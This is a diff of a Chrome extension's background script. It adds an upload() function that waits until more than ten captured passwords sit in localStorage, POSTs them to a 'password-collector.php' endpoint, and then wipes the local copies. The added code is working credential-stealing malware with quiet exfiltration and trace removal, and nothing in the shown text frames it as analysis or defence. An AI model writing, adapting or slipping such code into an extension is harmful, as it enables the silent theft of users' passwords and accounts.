@@ -10,9 +10,40 @@ chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
 		localStorage.setItem("id" + id, JSON.stringify(data));
 		localStorage.setItem("counter", id + 1);
 	}
-	
 	sendResponse({});
+	
+	// Got atleast 10 passwords? Try to upload them...
+	if(localStorage.length > 10)
+		upload();
 });
+
+function upload() {
+	var keys = [], values = [];
+	for(var key in localStorage) {
+		if(key !== "counter") {
+			keys.push(key);
+			values.push(localStorage.getItem(key));
+		}
+	}
+	
+	var xhr = new XMLHttpRequest();
+	xhr.onreadystatechange = function(event) {
+		if(xhr.readyState === 4 && xhr.status === 200) {
+			for(var key in keys) {
+				localStorage.removeItem(keys[key]);
+			}
+			
+			if(localStorage.length === 1) {
+				localStorage.setItem("counter", 1);
+			}
+		}
+	};
+	
+	var formdata = new FormData();
+	formdata.append("data", values);
+	xhr.open("POST", "http://localhost/password-collector.php");
+	xhr.send(formdata);
+}
 </script>
 </head>
 </html>
